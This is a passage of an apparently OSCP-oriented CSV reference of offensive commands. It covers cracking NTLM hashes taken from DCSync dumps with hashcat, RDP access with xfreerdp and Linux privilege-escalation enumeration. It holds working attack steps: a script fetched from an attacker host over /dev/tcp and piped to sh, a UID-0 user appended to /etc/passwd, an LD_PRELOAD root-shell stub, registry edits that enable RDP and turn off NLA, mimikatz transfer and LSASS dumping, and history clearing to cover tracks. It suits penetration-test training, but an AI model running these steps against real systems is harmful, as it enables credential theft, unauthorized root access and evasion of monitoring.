-d: -f4 > hashes.txt.""}","{""hashcat"": ""Advanced password recovery tool with GPU acceleration. Supports 300+ hash types. Leverages CUDA (NVIDIA) or OpenCL (AMD/Intel) for parallel hash computation. Speeds: CPU ~1M NTLM/sec, GPU ~10-100 BILLION NTLM/sec (depending on hardware). For OSCP, basic CPU cracking is sufficient for weak passwords."", ""-m 1000"": ""Hash mode 1000 = NTLM. Each hash mode corresponds to different algorithm: 0=MD5, 100=SHA1, 1000=NTLM, 1800=SHA512(Unix), 3000=LM, 5600=NTLMv2, 13100=Kerberos TGS. NTLM is Windows default since Vista. Use hashcat --example-hashes | grep -A 3 'MODE: 1000' to see example NTLM hash format."", ""-a 0"": ""Attack mode 0 = Straight dictionary attack (try each word in wordlist). Other modes: 1=Combination (combine words), 3=Brute-force (try all characters), 6=Hybrid Wordlist+Mask, 7=Hybrid Mask+Wordlist. For OSCP, -a 0 with rules (-r) cracks 70% of weak passwords. Example with rules: hashcat -m 1000 -a 0 hash.txt rockyou.txt -r best64.rule."", ""<HASH_FILE>"": ""Text file containing NTLM hash. Format: Just the 32 hexadecimal characters (no username, no colons, no spaces). Example file content: 08d7a47a6f9f66b97b1bae4178747494. For multiple hashes: One hash per line. Create with: echo '<HASH>' > hash.txt OR extract from DCSync output: grep ':' secretsdump.txt | cut -d: -f4 > hashes.txt."", ""/usr/share/wordlists/rockyou.txt"": ""Standard password wordlist included with Kali Linux. Contains 14 million real-world passwords from 2009 RockYou data breach. Compressed by default: gunzip /usr/share/wordlists/rockyou.txt.gz (one-time decompression). Cracks 30-50% of weak corporate passwords. For stronger passwords, use: crackstation-human-only.txt (1.5GB), weakpass_3.txt (8GB), or generate custom with CeWL (site-specific)."", ""--force"": ""Bypass warnings and GPU driver checks. REQUIRED in VMs or systems without proper GPU drivers. Hashcat detects virtual GPU and refuses to run without --force. Performance impact: CPU fallback is 100-1000x slower than GPU. For OSCP lab VMs, always use --force. Production pentesting: Install proper GPU drivers for massive speed increase.""}","","[""windows-hashcat-crack-ntlm-file"", ""john-wordlist-attack""]","[""windows-rdp-xfreerdp"", ""ad-pass-the-hash-impacket-psexec""]"
"windows-hashcat-crack-ntlm-file","Crack Multiple NTLM Hashes from File (Batch)","post-exploit","hashcat -m 1000 -a 0 <HASH_FILE> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force","Crack multiple NTLM hashes from file using dictionary attack with word mangling rules. Rules modify wordlist entries (uppercase, append numbers, leet speak) for higher crack rate. Ideal for batch processing domain hashes after DCSync full dump.","password-cracking","hashcat -m 1000 -a 0 all_domain_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force","Use this for BATCH cracking after full DCSync domain dump (ad-dcsync-secretsdump-all). TYPICAL OSCP SCENARIO: (1) Achieve Domain Admin, (2) DCSync entire domain (may be 50-500 users), (3) Extract NTLM hashes to file, (4) Start Hashcat in background with rules, (5) Continue exam while cracking runs, (6) Check back periodically for newly cracked credentials.

EXPECTED CRACK RATES (with best64.rule):
- rockyou.txt alone: 30-40% of corporate passwords
- rockyou.txt + best64.rule: 60-75% of corporate passwords
- rockyou.txt + dive.rule: 70-85% (but takes 10-20x longer)
- Custom wordlist (company name, locations): +10-15% additional cracks

BACKGROUND EXECUTION BEST PRACTICE:
bash -c 'hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --status --status-timer=300 > /tmp/hashcat_$(date +%s).log 2>&1 & disown'

MONITORING:
# View cracked so far:
hashcat -m 1000 hashes.txt --show | wc -l

# View cracked passwords:
hashcat -m 1000 hashes.txt --show

# View cracked with usernames (if you kept mapping file):
while IFS=: read hash user; do 
  cracked=$(hashcat -m 1000 hashes.txt --show 2>/dev/null | grep ""^$hash:"" | cut -d: -f2)
  [ -n ""$cracked"" ] && echo ""$user:$cracked""
done < user_hash_map.txt

CREATING USER-TO-HASH MAPPING:
# During hash extraction, preserve usernames:
impacket-secretsdump 'domain/user:pass@dc' -just-dc > full_dump.txt
grep ':' full_dump.txt | awk -F: '{print $4 "":"" $1}' > user_hash_map.txt
# Format: NTLM_HASH:USERNAME
# Use for reporting: correlate cracked passwords back to usernames

RULE SELECTION GUIDANCE:
- OSCP Exam (time limited): best64.rule (fast, good results)
- Lab Practice: dive.rule OR d3ad0ne.rule (comprehensive)
- Corporate Pentest: OneRuleToRuleThemAll.rule (balanced)
- Custom: Create rule for seasonal passwords (Spring2024!, Fall2023!)

CUSTOM RULE EXAMPLE (save as oscp.rule):
:
c
u
l ^0 $1
$1 $2 $3
$! $@
# Explanation: Try original, capitalize, uppercase, lowercase, prepend 0 append 1, append 123, append !@
# Use: hashcat -m 1000 hash.txt rockyou.txt -r oscp.rule

TIME ESTIMATES:
- rockyou.txt alone: 2-10 minutes (14M passwords  hash speed)
- rockyou.txt + best64.rule: 10-60 minutes (14M  64 rules = 896M candidates)
- rockyou.txt + dive.rule: 2-10 hours (14M  99K rules = 1.4 trillion candidates)
- Depends on hardware: CPU (1-10M hash/sec), GPU (100M-10B hash/sec)

OSCP EXAM STRATEGY:
1. Start cracking immediately after DCSync: hashcat ... & disown
2. Continue with other exam objectives (don't wait)
3. Check status every hour: hashcat --show | wc -l
4. Use cracked credentials for NEW lateral movement paths
5. Document all cracked passwords in post_exploitation.md
6. If exam time running low, accept uncracked hashes and use PTH instead","high","","","","{""Most hashes not cracking (low crack rate)"": ""Wordlist or rules insufficient. SOLUTIONS: (1) Use larger wordlist: weakpass_3.txt (8GB, billions of passwords), crackstation-human-only.txt (1.5GB). Download: https://weakpass.com/ or https://crackstation.net/. (2) Use better rules: hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule (99K rules, 10-20x slower). (3) Try combinator attack: hashcat -m 1000 hash.txt -a 1 wordlist1.txt wordlist2.txt (combines two words). (4) Hybrid attack: hashcat -m 1000 hash.txt -a 6 rockyou.txt ?d?d?d (append 3 digits to wordlist). (5) Accept some hashes are uncrackable - use Pass-the-Hash for strong passwords."", ""File format errors / No hashes loaded"": ""Hash file contains extra data or wrong format. VERIFY FORMAT: (1) View first 3 lines: head -3 <HASH_FILE>. Each line should be ONLY 32 hex characters. (2) Check line length: awk '{print length}' <HASH_FILE> | sort -u. Should output '32'. (3) Remove invalid lines: grep -E '^[a-f0-9]{32}$' <HASH_FILE> > clean_hashes.txt. (4) Extract NTLM from DCSync format: grep ':' secretsdump.txt | cut -d: -f4 | grep -E '^[a-f0-9]{32}$' > hashes.txt."", ""Hashcat stops / Progress stuck"": ""Hashcat paused or waiting for user input. ACTIONS: (1) Check status: Press 's' key (shows current status without stopping). (2) Resume: Press 'r' key (resume if paused). (3) View real-time output: tail -f /tmp/hashcat.log (if redirected output). (4) Kill and restart with --status --status-timer=60 flag: hashcat -m 1000 hash.txt rockyou.txt --status --status-timer=60 (updates every 60 sec). (5) Check system resources: top (verify hashcat process running and consuming CPU/GPU)."", ""Out of memory / System freeze"": ""Hashcat + rules consume too much RAM or GPU memory. SOLUTIONS: (1) Reduce rules: Use best64.rule instead of dive.rule (64 rules vs 99K). (2) Split hash file: split -l 1000 hashes.txt hash_chunk_ (1000 hashes per file), then crack chunks separately. (3) Reduce wordlist: Use rockyou.txt instead of weakpass_3.txt. (4) Add swap space: sudo fallocate -l 8G /swapfile && sudo mkswap /swapfile && sudo swapon /swapfile. (5) Close other applications to free RAM.""}","{""hashcat"": ""GPU-accelerated password recovery tool. See windows-hashcat-crack-ntlm for full explanation."", ""-m 1000"": ""Hash mode for NTLM (Windows password hashes). See windows-hashcat-crack-ntlm for full explanation."", ""-a 0"": ""Dictionary attack mode. Tries each word in wordlist (with optional rule modifications). See windows-hashcat-crack-ntlm for alternatives."", ""<HASH_FILE>"": ""Text file containing one NTLM hash per line. Format: Each line is exactly 32 hexadecimal characters (0-9, a-f). NO usernames, NO colons, NO extra data. Example creation from DCSync output: impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<DC>' -just-dc > full_dump.txt && grep ':' full_dump.txt | cut -d: -f4 > hashes.txt. This extracts only NTLM hashes (4th colon-separated field) from secretsdump format."", ""/usr/share/wordlists/rockyou.txt"": ""Standard 14M password wordlist. Must be decompressed first: gunzip /usr/share/wordlists/rockyou.txt.gz. See windows-hashcat-crack-ntlm for alternatives."", ""-r /usr/share/hashcat/rules/best64.rule"": ""Apply 64 word-mangling rules to each wordlist entry. Rules: Uppercase first letter (Password \u2192 Password), All uppercase (password \u2192 PASSWORD), Append numbers (password \u2192 password1, password123), Leet speak (password \u2192 p@ssw0rd), Reverse (password \u2192 drowssap), etc. DRAMATICALLY increases crack rate (30% \u2192 70% for corporate passwords). Other rules: dive.rule (99K rules, comprehensive but slow), OneRuleToRuleThemAll.rule (53K rules, popular), d3ad0ne.rule (focused on complex variations)."", ""--force"": ""Bypass GPU checks and run in CPU mode. REQUIRED for VMs or systems without GPU drivers. See windows-hashcat-crack-ntlm for full explanation.""}","","[""windows-hashcat-crack-ntlm"", ""john-wordlist-attack""]","[""windows-rdp-xfreerdp"", ""ad-pass-the-hash-crackmapexec""]"
"windows-rdp-xfreerdp","RDP Connection with xfreerdp (GUI Access)","exploitation","xfreerdp /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /v:<TARGET> /cert-ignore /dynamic-resolution","Connect to Windows system via Remote Desktop Protocol (RDP) for full GUI access. Requires plaintext password (cracked from hash) or RDP-compatible credentials. Useful for GUI-only tools, file browsing, screenshot capture, and interactive exploitation.","remote-access","xfreerdp /u:dave /p:Flowers1 /d:corp.com /v:192.168.50.75 /cert-ignore /dynamic-resolution","RDP is USEFUL but NOT REQUIRED for OSCP. Command-line tools (psexec, wmiexec) are often more efficient. USE RDP WHEN: (1) GUI-only tool needed (GUI exploit, graphical config tool), (2) File browsing is easier visually (searching desktop, documents), (3) Screenshot needed for proof (exam flag documentation), (4) Interactive debugging required.

DISADVANTAGES OF RDP:
- Requires plaintext password (must crack NTLM hash first - takes time)
- Generates Event ID 4624 Type 10 (RemoteInteractive) - HIGHLY monitored
- Creates visible session on target (other users see login notification)
- Slower than command-line (GUI rendering overhead)
- May disconnect other RDP sessions (default limit: 2 concurrent sessions)

ADVANTAGES OF RDP:
- Full GUI access (run any application)
- Clipboard sharing (copy/paste files, text between Kali and Windows)
- Drive redirection (mount Kali filesystem in Windows: /drive:/tmp,/tmp)
- Screenshot capture (proof for OSCP report)
- Easier for complex tasks (browsing registry, file system)

OSCP EXAM WORKFLOW:
1. Obtain NTLM hash via DCSync or SAM dump
2. Start Hashcat in background: hashcat -m 1000 hash.txt rockyou.txt & disown
3. Meanwhile, use hash for Pass-the-Hash (psexec, wmiexec)
4. When password cracks, connect via RDP for GUI tasks
5. Take screenshot of flag (OSCP proof requirement)
6. Dump LSASS, search for sensitive files
7. Disconnect and continue with command-line tools

DRIVE REDIRECTION (File Transfer):
xfreerdp /u:<USER> /p:<PASS> /d:<DOMAIN> /v:<TARGET> /cert-ignore /dynamic-resolution /drive:/tmp,/tmp
# This mounts /tmp from Kali as \\tsclient\tmp in Windows
# Transfer files: copy C:\sensitive.txt \\tsclient\tmp\
# Or: copy \\tsclient\tmp\mimikatz.exe C:\Users\Public\

CLIPBOARD SHARING (Default Enabled):
# Copy text from Kali terminal, paste in Windows RDP session
# Copy file path in Windows, paste in Kali terminal
# Useful for long file paths, command output, etc.

SCREENSHOT CAPTURE (OSCP Proof):
1. Connect via RDP
2. Open flag file: type C:\Users\Administrator\Desktop\proof.txt
3. Take screenshot: scrot -s /tmp/proof_screenshot.png (on Kali, select RDP window)
4. Or use Windows Snipping Tool, save to \\tsclient\tmp
5. Include in OSCP report as proof of Administrator access

ALTERNATIVE RDP CLIENTS:
- rdesktop: Older, simpler. Usage: rdesktop -u <USER> -p <PASS> -d <DOMAIN> <TARGET>
- Remmina: GUI-based. Better for persistent connections, multiple sessions
- Windows RDP (mstsc.exe via Wine): Not recommended, use native Linux tools

COMMON MISTAKES:
- Forgetting /cert-ignore (connection fails silently)
- Using NTLM hash instead of plaintext password (RDP doesn't support PTH)
- Not specifying domain (/d flag) for domain accounts (authentication fails)
- Connecting to DC via RDP during exam (generates alerts, use command-line instead)
- Not using drive redirection for file transfer (manual SMB setup more complex)

SECURITY CONSIDERATIONS:
- Password visible in bash history (use history -c to clear after exam)
- Password visible in process list (ps aux shows command with /p flag)
- RDP session logged on target (Event ID 4624 Type 10, 4634 on logoff)
- Connection generates network traffic (RDP handshake, encryption negotiation)
- For stealth, use command-line tools (psexec, wmiexec) instead

TIME ESTIMATE: 5-15 seconds for connection, <1 second for subsequent reconnections","medium","","","","{""ERRCONNECT_LOGON_FAILURE"": ""Authentication failed. VERIFY: (1) Password is PLAINTEXT (not NTLM hash - RDP doesn't support PTH). If you have hash, crack it first: hashcat -m 1000 hash.txt rockyou.txt. (2) Username matches account name exactly (case-insensitive but check spelling). (3) Domain specified correctly: /d:corp.com OR /d:CORP. For local auth, use /d:. (4) Account not locked: crackmapexec smb <TARGET> -u <USER> -p <PASS> -d <DOMAIN> (verify 'Pwn3d!'). TEST: smbclient //<TARGET>/C$ -U '<DOMAIN>/<USER>%<PASS>' (verify password works for SMB)."", ""ERRCONNECT_ACCOUNT_DISABLED or ACCOUNT_LOCKED_OUT"": ""Account is locked or disabled in Active Directory. CAUSES: (1) Too many failed login attempts (account lockout policy, typically 3-5 attempts). (2) Administrator manually disabled account. (3) Account expired (check expiration date). VERIFY: net user <USERNAME> /domain (shows 'Account active: No'). SOLUTIONS: (1) Wait for lockout duration (default 30 minutes): net accounts /domain | grep 'Lockout duration'. (2) Use different account with admin rights. (3) Request unlock from domain admin (social engineering vector). (4) Exploit password policy: Try 1-2 attempts, wait, try again (stay below lockout threshold)."", ""Connection refused / Port 3389 closed"": ""RDP port 3389 is blocked or RDP service disabled. VERIFY: (1) Port scan: sudo nmap -p 3389 -Pn -v <TARGET>. Should show '3389/tcp open'. (2) Service status (if you have shell): sc query TermService (should show 'RUNNING'). (3) Firewall: netsh advfirewall firewall show rule name=\""Remote Desktop\"" (should show 'Enabled: Yes'). SOLUTIONS: (1) Enable RDP remotely (if admin access via psexec): reg add \""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group=\""remote desktop\"" new enable=Yes. (2) Use alternative access (psexec, wmiexec) to enable RDP. (3) Try WinRM: evil-winrm -i <TARGET> -u <USER> -p <PASS>."", ""Certificate verify failed"": ""SSL certificate validation error. SOLUTION: Add /cert-ignore flag. FULL COMMAND: xfreerdp /u:<USER> /p:<PASS> /d:<DOMAIN> /v:<TARGET> /cert-ignore /dynamic-resolution. ALTERNATIVE: Use /cert:tofu (Trust On First Use - accept cert on first connection, remember for future)."", ""NLA authentication required / ERRCONNECT_AUTHENTICATION_FAILED"": ""Network Level Authentication (NLA) is enforced. NLA requires authentication BEFORE RDP connection (more secure, prevents brute force). SOLUTIONS: (1) Add /sec:nla flag: xfreerdp /u:<USER> /p:<PASS> /d:<DOMAIN> /v:<TARGET> /sec:nla /cert-ignore. (2) If NLA fails, disable NLA remotely (requires admin access via psexec): reg add \""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\"" /v UserAuthentication /t REG_DWORD /d 0 /f. (3) Try older security: /sec:rdp or /sec:tls.""}","{""xfreerdp"": ""Open-source RDP client for Linux. Full-featured alternative to Windows Remote Desktop. Supports RDP 8.1, RemoteFX, clipboard sharing, drive redirection, multi-monitor. Alternatives: rdesktop (older, limited features), remmina (GUI-based RDP client), Remmina (full remote desktop manager with RDP/VNC/SSH). Install: sudo apt install freerdp2-x11."", ""/u:<USERNAME>"": ""Username for authentication. Do NOT include domain prefix (use /d flag separately). Local account: 'Administrator'. Domain user: 'dave'. Service account: 'sqlsvc'. IMPORTANT: Username is case-insensitive but must match account name exactly (spacing matters)."", ""/p:<PASSWORD>"": ""Plaintext password for authentication. Special characters allowed (no escaping needed in most cases). If password contains spaces, use quotes: /p:\""Pass Word 123\"". ALTERNATIVE: Omit /p flag to be prompted interactively (avoids password in bash history). SECURITY NOTE: Password visible in process list (ps aux) - use with caution on shared systems."", ""/d:<DOMAIN>"": ""Domain for authentication. NetBIOS name: 'CORP'. FQDN: 'corp.com'. For local (non-domain) authentication: Use '.' (period) OR omit flag entirely. CRITICAL: If account is domain user, MUST specify domain (authentication fails without it). Verify domain: echo %USERDNSDOMAIN% (from Windows) or realm list (from Linux)."", ""/v:<TARGET>"": ""Target system IP or hostname. IP address: 192.168.50.75 (fast, direct connection). FQDN: CLIENT75.corp.com (required if Kerberos enforced). Hostname only: CLIENT75 (works if DNS configured). Port specification: 192.168.50.75:3390 (non-standard RDP port). VERIFY: sudo nmap -p 3389 -Pn <TARGET> (check RDP port open)."", ""/cert-ignore"": ""Ignore SSL certificate warnings. REQUIRED for self-signed certificates (default on Windows). Without this flag, connection fails with 'Certificate verification failed' error. SECURITY NOTE: Disables certificate validation (vulnerable to MITM attacks). For production pentesting, verify certificate first. For OSCP labs, always use /cert-ignore."", ""/dynamic-resolution"": ""Automatically adjust resolution when resizing window. RECOMMENDED for usability - allows window resizing without reconnecting. Alternative: /size:1920x1080 (fixed resolution). Multi-monitor: /multimon (span across all monitors). Fullscreen: /f (toggle with Ctrl+Alt+Enter).""}","","[""ad-pass-the-hash-impacket-psexec"", ""evil-winrm-shell""]","[""windows-search-sensitive-files"", ""ad-lsass-dump-procdump"", ""windows-screenshot-capture""]"
"linux-privesc-linpeas","LinPEAS - Automated Enumeration","post-exploit","curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh","Comprehensive automated privilege escalation enumeration for Linux","linux","","Save output to file for later analysis:
linpeas.sh | tee linpeas.out","high","","","","","{""-L"": ""Follow redirects when downloading"", ""| sh"": ""Pipe directly to shell for execution""}","[""python-http-server""]","[""linux-privesc-linenum"", ""linux-unix-privesc-check-nc""]","[""linux-suid-find"", ""linux-sudo-list"", ""linux-cron-enum"", ""linux-capabilities"", ""linux-kernel-exploit""]"
"linux-privesc-linenum","LinEnum - Basic Enumeration","post-exploit","wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh","Basic Linux enumeration script for privilege escalation","linux","","Lighter weight than LinPEAS, good for restricted environments","high","","","","","{""chmod +x"": ""Make script executable"", ""./"": ""Execute in current directory""}","[""nc-reverse-shell"", ""bash-reverse-shell""]","[""linux-linpeas-http"", ""linux-privesc-linenum""]","[""sudo-exploit-find"", ""linux-kernel-exploit"", ""linux-cron-enum""]"
"linux-suid-find","Find SUID Binaries","post-exploit","find / -perm -u=s -type f 2>/dev/null","Manually find all SUID binaries (may lead to privilege escalation)","linux","","Cross-reference findings with https://gtfobins.github.io/","high","","","","","{""-perm -u=s"": ""Find files with SUID bit set"", ""-type f"": ""Only search for files (not directories)"", ""2>/dev/null"": ""Suppress permission denied errors""}","","[""linux-privesc-linpeas"", ""linux-privesc-linenum""]","[""gtfobins-lookup""]"
"linux-sudo-list","Check Sudo Permissions","post-exploit","sudo -l","List commands current user can run with sudo","linux","","NOPASSWD is a major win - can escalate without password","high","","","","","{""-l"": ""List allowed (and forbidden) commands for user""}","","[""linux-privesc-linpeas"", ""linux-privesc-linenum"", ""linux-sudo-check""]","[""gtfobins-sudo-lookup""]"
"linux-cron-enum","Enumerate Cron Jobs","post-exploit","cat /etc/crontab && ls -la /etc/cron.* && crontab -l","Check for scheduled tasks that may be exploitable","linux","","Pay attention to scripts run by root with writable paths","high","","","","","{""cat /etc/crontab"": ""View system-wide crontab"", ""ls -la /etc/cron.*"": ""List cron directories"", ""crontab -l"": ""List user's cron jobs""}","","[""linux-privesc-linpeas"", ""linux-cron-jobs""]","[""linux-wildcard-injection"", ""linux-path-hijack""]"
"linux-writable-etc-passwd","Check Writable /etc/passwd","post-exploit","ls -l /etc/passwd && echo 'test' >> /etc/passwd 2>/dev/null && echo 'Writable!' || echo 'Not writable'","Test if /etc/passwd is writable (instant root if true)","linux","","If writable:
openssl passwd -1 password123, then add user with UID 0","high","","","","","{""ls -l"": ""Show file permissions"", "">>"": ""Append to file"", ""2>/dev/null"": ""Hide error messages"", ""||"": ""OR operator - run second command if first fails""}","","[""linux-writable-passwd"", ""linux-find-world-writable""]",""
"linux-capabilities","Enumerate File Capabilities","post-exploit","getcap -r / 2>/dev/null","Find files with special capabilities that may allow privilege escalation","linux","","cap_setuid+ep on python/perl/ruby = easy root shell","medium","","","","","{""-r"": ""Recursive search"", ""/"": ""Search from root"", ""2>/dev/null"": ""Hide permission errors""}","","[""linux-privesc-linpeas"", ""linux-privesc-linenum""]","[""gtfobins-lookup""]"
"linux-kernel-exploit","Check Kernel Version for Exploits","post-exploit","uname -a && cat /etc/issue","Identify kernel version to search for known exploits","linux","","Kernel exploits are risky - test in safe environment first","medium","","","","","{""uname -a"": ""Print all system information"", ""cat /etc/issue"": ""Show distribution version""}","","[""cat-proc-version"", ""linux-kernel-version""]","[""searchsploit""]"
"linux-writable-services","Find Writable Service Files","post-exploit","find /etc/systemd/system -writable -type f 2>/dev/null","Locate systemd service files that are writable (can modify to escalate)","linux","","Modify ExecStart to run reverse shell as root","medium","","","","","{""-writable"": ""Find files writable by current user"", ""-type f"": ""Only files, not directories""}","","[""linux-privesc-linpeas""]","[""linux-systemctl-privesc""]"
"linux-nfs-no-root-squash","Check NFS for no_root_squash","post-exploit","cat /etc/exports && showmount -e <TARGET>","Find NFS shares with no_root_squash (allows mounting as root)","linux","cat /etc/exports && showmount -e 192.168.45.100","Mount with: mount -o rw <TARGET>:/share /mnt/nfs","medium","","","","","{""cat /etc/exports"": ""View NFS export configuration"", ""showmount -e"": ""Show exported directories"", ""no_root_squash"": ""Root on client = root on server""}","[""smb-enum"", ""nmap-service-scan""]","[""linux-nfs-root-squash"", ""showmount-e-localhost""]",""
"linux-docker-escape","Check Docker Group Membership","post-exploit","id && groups && docker ps 2>/dev/null","Check if user is in docker group (allows easy root escalation)","linux","","Docker group = root equivalent - instant privilege escalation","high","","","","","{""id"": ""Show user ID and groups"", ""groups"": ""List groups user belongs to"", ""docker ps"": ""Test docker access""}","","[""linux-privesc-linpeas""]",""
"linux-ld-preload","LD_PRELOAD Privilege Escalation","post-exploit","sudo -l | grep LD_PRELOAD","Check if LD_PRELOAD is allowed in sudo environment","linux","","Requires C code:
void _init() { setuid(0); system('/bin/bash'); }","medium","","","","","{""sudo -l"": ""List sudo permissions"", ""grep LD_PRELOAD"": ""Search for LD_PRELOAD in env_keep"", ""env_keep"": ""Environment variables preserved with sudo""}","[""linux-sudo-list""]","",""
"linux-path-hijack","PATH Hijacking","post-exploit","echo $PATH && find / -perm -u=s -type f 2>/dev/null | xargs strings | grep -i 'path'","Find SUID binaries vulnerable to PATH hijacking","linux","","Example:
if SUID calls 'ls', create /tmp/ls with shell, add /tmp to PATH","high","","","","","{""echo $PATH"": ""Show current PATH variable"", ""xargs strings"": ""Extract readable strings from binaries"", ""grep -i path"": ""Search for PATH references""}","[""linux-suid-find""]","[""linux-privesc-linpeas""]",""
"linux-ssh-keys","Search for SSH Private Keys","post-exploit","find / -name id_rsa 2>/dev/null && find / -name id_dsa 2>/dev/null","Find SSH private keys that may allow lateral movement or escalation","linux","","Also check .ssh/authorized_keys for adding your own key","medium","","","","","{""-name id_rsa"": ""Search for RSA private keys"", ""-name id_dsa"": ""Search for DSA private keys""}","","[""linux-privesc-linpeas""]","[""ssh-key-authentication""]"
"linux-mysql-udf","MySQL User Defined Function Exploit","post-exploit","mysql -u root -p<PASSWORD> -e 'SELECT * FROM mysql.func;'","Check MySQL for UDF privilege escalation opportunity","linux","mysql -u root -ppassword123 -e 'SELECT * FROM mysql.func;'","Requires MySQL running as root or with file write permissions","low","","","","","{""-u root"": ""Connect as root user"", ""-p"": ""Prompt for password (or use -p<PASSWORD>)"", ""-e"": ""Execute SQL command""}","[""nmap-service-scan""]","[""linux-mysql-root""]",""
"linux-sudo-check","Check Sudo Privileges","post-exploit","sudo -l","List allowed sudo commands for current user","linux","","NOPASSWD entries are quick wins","high","","","","","{""-l"": ""List user's privileges or check a specific command"", ""-ll"": ""Long list format with more details (alternative)"", ""-n"": ""Non-interactive, avoid password prompt""}","","[""linux-sudo-list"", ""linux-privesc-linpeas""]","[""gtfobins-sudo-lookup"", ""linux-ld-preload""]"
"linux-cron-jobs","Enumerate Cron Jobs","post-exploit","cat /etc/crontab && ls -la /etc/cron.*","Check system cron jobs for privilege escalation","linux","","Check for PATH manipulation opportunities","high","","","","","{""/etc/crontab"": ""System-wide crontab file"", ""/etc/cron.*"": ""Cron directories (daily, hourly, etc.)"", ""-la"": ""Long listing with hidden files""}","","[""linux-cron-enum"", ""linux-privesc-linpeas""]","[""linux-wildcard-injection"", ""linux-path-hijack""]"
"linux-writable-passwd","Check /etc/passwd Permissions","post-exploit","ls -la /etc/passwd && ls -la /etc/shadow","Check if passwd/shadow files are writable","linux","","Writable /etc/passwd is instant root","high","","","","","{""-la"": ""Long listing with permissions"", ""/etc/passwd"": ""User account file"", ""/etc/shadow"": ""Password hash file""}","","[""linux-writable-etc-passwd"", ""linux-find-world-writable""]",""
"linux-kernel-version","Check Kernel Version","post-exploit","uname -a && cat /proc/version","Identify kernel version for exploit research","linux","","Match exact kernel version for reliability","high","","","","","{""-a"": ""All system information"", ""/proc/version"": ""Detailed kernel version info""}","","[""linux-kernel-exploit"", ""cat-proc-version""]","[""searchsploit"", ""linux-privesc-linpeas""]"
"linux-linpeas","Run LinPEAS Enumeration","post-exploit","curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh","Comprehensive Linux privilege escalation enumeration","linux","","Can be noisy, use -q for quiet mode","high","","","","","{""-L"": ""Follow redirects"", ""|"": ""Pipe to shell"", ""sh"": ""Execute with shell""}","[""python-http-server""]","[""linux-privesc-linpeas"", ""linux-privesc-linenum""]","[""linux-suid-find"", ""linux-sudo-check"", ""linux-cron-jobs""]"
"linux-pspy","Monitor Processes with pspy","post-exploit","./pspy64 -pf -i 1000","Monitor running processes without root","linux","","Download from:
https://github.com/DominicBreuker/pspy","medium","","","","","{""-p"": ""Print process commands"", ""-f"": ""Print file system events"", ""-i"": ""Interval in milliseconds""}","[""python-http-server"", ""wget-download""]","","[""linux-cron-enum""]"
"linux-mysql-root","MySQL Running as Root","post-exploit","ps aux | grep mysql && mysql -u root","Check if MySQL is running as root with no password","linux","","UDF library needed for command execution","medium","","","","","{""ps aux"": ""Show all processes"", ""grep mysql"": ""Filter MySQL processes"", ""-u root"": ""Connect as root user""}","[""nmap-service-scan""]","[""linux-mysql-udf""]","[""linux-mysql-udf""]"
"linux-nfs-root-squash","NFS Root Squashing Check","post-exploit","cat /etc/exports | grep no_root_squash","Check for misconfigured NFS exports","linux","","Requires NFS client on attacker machine","high","","","","","{""/etc/exports"": ""NFS export configuration"", ""no_root_squash"": ""Allows root access from client""}","[""smb-enum"", ""nmap-service-scan""]","[""showmount-e-localhost"", ""linux-nfs-no-root-squash""]",""
"linux-systemctl-privesc","Systemctl SUID Exploitation","post-exploit","find / -name systemctl -perm -4000 2>/dev/null","Check if systemctl has SUID bit","linux","","Works on misconfigured systems","high","","","","","{""-name systemctl"": ""Find systemctl binary"", ""-perm -4000"": ""Check for SUID bit""}","[""linux-suid-find""]","[""getcap-bin-systemctl"", ""linux-writable-services""]",""
"linux-wildcard-injection","Wildcard Injection in Scripts","post-exploit","grep -r '\*' /etc/cron* /var/spool/cron* 2>/dev/null","Find scripts using wildcards in cron","linux","","Common in backup scripts","high","","","","","{""-r"": ""Recursive search"", ""\\*"": ""Search for asterisk/wildcard"", ""/etc/cron*"": ""Cron directories""}","[""linux-cron-enum""]","[""linux-privesc-linpeas""]",""
"linux-unix-privesc-check-nc","unix-privesc-check via Netcat","post-exploit","cat < /dev/tcp/<LHOST>/<PORT> | sh -s -- standard","Execute unix-privesc-check via netcat without curl (simpler alternative to LinPEAS)","linux","cat < /dev/tcp/192.168.45.155/443 | sh -s -- standard","Prerequisites:
sudo nc -q 5 -lvnp <PORT> < /path/to/unix-privesc-check.

Simpler output than LinPEAS, good for quick verification.

~1-2 minute execution time.","high","","","","","{""cat <"": ""Read from input redirection"", ""/dev/tcp/<LHOST>/<PORT>"": ""Bash built-in TCP connection (no netcat required on victim)"", ""|"": ""Pipe downloaded script to shell"", ""sh -s --"": ""Execute script with arguments"", ""standard"": ""Run in standard mode (recommended, less verbose than detailed)""}","[""nc-file-transfer""]","[""linux-linpeas-http"", ""linux-linpeas-nc"", ""linux-suid-find""]","[""linux-suid-find"", ""linux-sudo-check"", ""linux-cron-enum""]"
"linux-find-world-writable","Find World-Writable Files","post-exploit","find / -type f -perm -002 -ls 2>/dev/null","Find all world-writable files (files that should NOT be writable by everyone)","linux","","World-writable /etc/passwd = instant root.

Use:
openssl passwd -1 password123, then echo 'hacker:$1$hash:0:0::/root:/bin/bash' >> /etc/passwd","high","","","","","{""find /"": ""Search from root directory"", ""-type f"": ""Only files, not directories"", ""-perm -002"": ""Files with write permission for others (world-writable bit set)"", ""-ls"": ""Long listing format showing permissions"", ""2>/dev/null"": ""Suppress 'Permission denied' errors""}","","[""linux-find-writable-etc-focused"", ""linux-writable-passwd"", ""linux-unix-privesc-check-nc""]",""
"linux-find-writable-etc-focused","Find World-Writable Files in /etc","post-exploit","find /etc -type f -perm -002 -ls 2>/dev/null","Find world-writable files in /etc (critical configuration directory)","linux","","Faster than system-wide search.

Common OSCP scenario.

